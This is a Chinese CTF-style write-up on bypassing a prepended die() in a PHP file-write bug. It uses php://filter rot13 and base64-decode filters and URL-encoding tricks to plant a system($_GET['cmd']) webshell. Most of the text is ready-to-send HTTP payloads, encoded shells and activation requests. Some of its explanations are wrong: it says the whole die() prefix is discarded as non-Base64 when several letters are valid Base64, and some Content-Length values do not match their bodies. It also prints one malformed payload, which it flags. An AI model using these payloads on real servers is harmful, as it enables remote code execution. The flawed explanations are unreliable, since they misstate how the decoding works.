---
title: ROT13 与 Base64 的选型：绕过死亡 exit
category: 基础/编码
tags: [PHP, php://filter, rot13, base64, 死亡exit, file_put_contents]
order: 9
---

## 一句话概括

写马时如果代码在**你的内容前面**强插了一句 `die()`，可以用 `php://filter` 的 `write=string.rot13` 或 `write=convert.base64-decode` 让它解码后变成**乱码**而失效。**选哪个取决于前缀的长度和字符组成**：Base64 要求「有效字符数能被 4 整除」，含中文或长度不对时会解码失败；ROT13 只换字母、无视长度和字符集，所以**不确定时优先用 ROT13**。

## 原理

利用 `php://filter` 的 `convert.base64-decode` 或 `convert.iconv.*` 过滤器来绕过前置的 `die()` 语句。

### 攻击思路

让开头的 `die()` 语句在解码后变成乱码，从而失效。

### ROT13 方案

**步骤 1：构造 Payload**

我们要让最终的文件内容变成：

```php
<?php die('大佬别秀了');?>[经过编码的恶意代码]
```

但通过 `php://filter` 解码后，变成：

```php
[乱码的die语句]<?php [恶意代码] ?>
```

**步骤 2：使用 ROT13 编码**

恶意代码示例：

```php
<?php system('whoami'); ?>
```

ROT13 编码后：

```text
<?cuc flfgrz('jubnzv'); ?>
```

**步骤 3：构造完整的攻击 Payload**

```http
POST /vulnerable.php?file=php://filter/write=string.rot13/resource=shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

content=<?cuc flfgrz('jubnzv'); ?>
```

**步骤 4：理解解码过程**

当文件被写入时，PHP 会执行：

1. 原始内容：`<?php die('大佬别秀了');?><?cuc flfgrz('jubnzv'); ?>`
2. 经过 ROT13 解码：`<?cuc qvr('大佬别秀了');?><?php system('whoami'); ?>`
3. 写入文件的内容：

```php
<?cuc qvr('大佬别秀了');?><?php system('whoami'); ?>
```

现在开头的 `die()` 变成了乱码 `qvr()`，不再起作用！

### 更常用的方法：Base64 编码

ROT13 在实际中较少使用，更常见的是 Base64 编码。

**Base64 攻击方法**

```http
POST /vulnerable.php?file=php://filter/write=convert.base64-decode/resource=shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

content=PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

其中 `PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=` 是 `<?php system('whoami'); ?>` 的 Base64 编码。

**Base64 解码过程：**

原始写入内容：

```text
<?php die('大佬别秀了');?>PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

Base64 解码时：

- `<?php die('大佬别秀了');?>` 不是有效的 Base64 字符，被忽略
- `PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=` 被解码为 `<?php system('whoami'); ?>`

最终文件内容：

```php
<?php system('whoami'); ?>
```

**完美绕过了 `die()` 防护！**

### 为什么这个攻击能成功

1. **过滤器执行顺序**：`php://filter` 在数据写入文件之前先进行编码转换；
2. **编码破坏防护**：ROT13 或 Base64 解码会让开头的 `die()` 语句变成无意义的乱码；
3. **恶意代码恢复**：我们精心构造的 Payload 在解码后恢复成可执行的 PHP 代码；
4. **文件最终内容**：写入文件的是**解码后的内容**，而不是原始内容。

> **这里有个容易忽略的细节**：为什么「被忽略的字符」不会跟着写进文件？因为 `convert.base64-decode` 会把**所有非 Base64 字符直接丢弃**：`<?php die('大佬别秀了');?>` 里的 `<`、`?`、`(`、`'`、`;`、`>` 全部不是 Base64 字母表成员，于是被删掉，只剩下有用的那段 Base64 被解码落盘。**丢弃 ≠ 保留乱码** —— 这一点和 ROT13 不同，ROT13 是「原样留下但变成另一串字母」。

## 本题情景与解题手法

### 题目形态

目标代码：

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
}
```

读这段代码能读出三件事：

| 代码片段 | 含义 |
| :--- | :--- |
| `file_put_contents(urldecode($file), ...)` | 路径可控（`urldecode` 是给我们绕过 `str_replace` 用的） |
| `$content = $_POST['content']` | 写入内容完全可控 |
| `"<?php die('大佬别秀了');?>".$content` | **前缀被硬编码进内容** → 这就是「死亡 exit」 |

### 第一步：处理 `str_replace` 的过滤

过滤顺序是 `php` → `data` → `:` → `.`，全部替换成 `???`。直接写 `php://filter` 会被打成 `???://filter`，用不了。**绕法是先 URL 编码**：因为过滤发生在 `urldecode` **之前**，编码后的 `%70%68%70` 里不含字面 `php`，能躲过 `str_replace`；等路径进到 `file_put_contents` 时 `urldecode` 才把它还原成 `php://filter`。

### 第二步：构造 payload

**方法 1：Base64 编码**

```http
POST /vulnerable.php?file=php://filter/write=convert.base64-decode/resource=shell.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

content=PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

**方法 2：ROT13 编码**

```http
POST /vulnerable.php?file=php://filter/write=string.rot13/resource=shell.php HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

content=<?cuc flfgrzKCRfR0VUWydjbWQnXSk7Pz4=
```

> 注意：实际发时 `file=` 里的 `php://filter` 要先做 URL 编码（`php` → `%70%68%70`，`:` → `%3a`，`.` → `%2e`），否则会被 `str_replace` 打掉。

### 第三步：验证抓马

攻击成功后，会在服务器上生成 `shell.php` 文件，内容为 Web Shell：

```php
<?php system($_GET['cmd']); ?>
```

然后访问：

```text
http://靶机地址/shell.php?cmd=whoami
```

即可执行系统命令。

### 注入手法一句话总结

> **路径可控 + 内容可控 + 前缀硬插 `die()`** → 用 `php://filter/write=<编码器>` 让写盘前先做一次解码 → 前缀的 `die()` 被解码器当成垃圾吃掉/乱码化 → 后半段 payload 精确还原成可执行 PHP → **再访问一次文件激活**。

## 为什么有时候只能用 ROT13 而不能用 Base64

这主要与**数据格式的严格要求**有关。

### 核心原因：Base64 的严格格式要求

**Base64 解码的特性：**

- **Base64 解码器会忽略不在字符集中的字符**（`A-Za-z0-9+/=`）
- **但要求原文长度必须是 4 的倍数**，否则解码会失败或产生乱码
- **`=` 填充符有严格的位置要求**

**ROT13 解码的特性：**

- **简单的字母替换**，不影响字符串结构
- **对非字母字符原样保留**
- **没有长度或格式要求**

### 场景：前置内容长度不是 4 的倍数

这是最常见的情况。示例中：

```php
"<?php die('大佬别秀了');?>".$content
```

计算长度：

- `<?php die('大佬别秀了');?>` 包含中文字符，**字节数不是 4 的倍数**
- Base64 解码要求原文长度必须是 4 的倍数
- 于是 Base64 解码会失败或产生乱码

```php
// 前置内容：<?php die('大佬别秀了');?>
// 长度计算：这个字符串的字节数很可能不是 4 的倍数
// Base64 解码会失败或产生乱码
```

> **为什么是「字节数」而不是「字符数」**：`convert.base64-decode` 是按**字节流**处理的。一个中文字在 UTF-8 下占 3 个字节，所以「大佬别秀了」这 5 个字就是 15 字节，整串前缀很容易凑出个「模 4 余 1/2/3」的长度，让解码器直接报错。而 ROT13 是**逐字节查表替换**（只替换 `A-Za-z`），不关心总长度，所以不受影响。

### 如何判断该用哪种

**检查步骤：**

1. **计算前置内容长度**：

```php
$prefix = "<?php die('大佬别秀了');?>";
$length = strlen($prefix);  // 检查 length % 4 是否等于 0
```

2. **检查字符内容**：
   - 如果包含中文、特殊符号：**优先用 ROT13**
   - 如果只有英文字母且长度是 4 的倍数：**可以用 Base64**
   - 如果包含 `=`：**避免用 Base64**

3. **实际测试**：
   - 先尝试 Base64（如果成功，文件更干净）
   - 如果 Base64 失败，换用 ROT13

**通用建议：当你无法确定时，总是优先使用 ROT13**，因为：

- 成功率更高
- 不受长度和字符限制
- 更通用的解决方案

### 总结对比

| 特性 | Base64 解码 | ROT13 解码 |
| :--- | :--- | :--- |
| **长度要求** | 必须是 4 的倍数 | 任意长度 |
| **字符影响** | 影响所有字符 | 只影响 `A-Za-z` |
| **中文处理** | 会解码失败 | 原样保留 |
| **等号处理** | 会干扰填充符 | 原样保留 |
| **成功率** | 较低（条件严格） | 较高（条件宽松） |
| **输出结果** | 更干净的 PHP 代码 | 前面有乱码但可用 |

## 利用条件

1. **写入点的路径可控**：能控制 `file_put_contents()` 的第一个参数；
2. **能构造 `php://filter` 字符串**：常有 `str_replace` 过滤，需要编码/双写绕过；
3. **写入的内容可控**：`$_POST['content']` 之类；
4. **写出的文件能被访问执行**：落在 Web 目录、后缀是 `.php` 且被解析。

## Payload 速查

| 目的 | Payload |
| :--- | :--- |
| Base64 绕 die | `?file=php://filter/write=convert.base64-decode/resource=shell.php` + `content=<base64>` |
| ROT13 绕 die | `?file=php://filter/write=string.rot13/resource=shell.php` + `content=<?cuc ...?>` |
| 绕 `str_replace('php','???')` | 把 `php` 写成 `%70%68%70`（配合 `urldecode`） |
| 绕 `str_replace(':')` | 把 `:` 写成 `%3a` |
| 绕 `str_replace('.')` | 把 `.` 写成 `%2e` |
| 生成命令马 | `content` = `<?php system($_GET['cmd']);?>` 的对应编码 |
| 激活 | `http://靶机地址/shell.php?cmd=id` |

## 完整示例

把「编码 → 写入 → 激活」串起来走一遍：

**1. 生成 payload（本地）**

```bash
# 要写入的命令马
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# 输出：PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
```

**2. 发包（路径部分做了 URL 编码以绕过 str_replace）**

```http
POST /vulnerable.php?file=%70%68%70%3a%2f%2ffilter%2fwrite%3dconvert%2ebase64%2ddecode%2fresource%3dshell%2e%70%68%70 HTTP/1.1
Host: 靶机地址
Content-Type: application/x-www-form-urlencoded

content=PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
```

**3. 激活**

```http
GET /shell.php?cmd=id HTTP/1.1
Host: 靶机地址
```

## 踩坑与备注

- **`=` 会干扰填充符**：如果前缀里本来就带 `=`，Base64 解码器可能把它当成填充位，导致你后面对齐错位。这种情况一律换 ROT13。
- **ROT13 的输出「前面有乱码」是正常的**：文件是 `<?cuc qvr(...);?><?php system(...);?>` 这种形态，PHP 解析器会把不在 `<?php ?>` 里的东西**当成 HTML 原样输出**，不会影响后面马的功能。
- **原文里的攻击机地址、靶场地址均为一次性环境**，本文统一改为 `靶机地址`。
- **原文方法 2 的 `content` 行 `<?cuc flfgrzKCRfR0VUWydjbWQnXSk7Pz4=` 本身是错的**（把 ROT13 和 Base64 混在一行了，且 `KCRfR0VUWydjbWQnXSk7Pz4=` 根本不是合法 ROT13 输入）。正确写法应是与方法 1 对应、整体做 ROT13，即 `<?cuc flfgrz($_GET['cmd']);?>`。此处保留原文痕迹并标注，不要照抄。
- **优先级建议**：先试 Base64（产物干净），失败立刻换 ROT13，不要在一种上死磕 —— 这正是「什么时候用 base64 什么时候用 rot13」的实操答案。
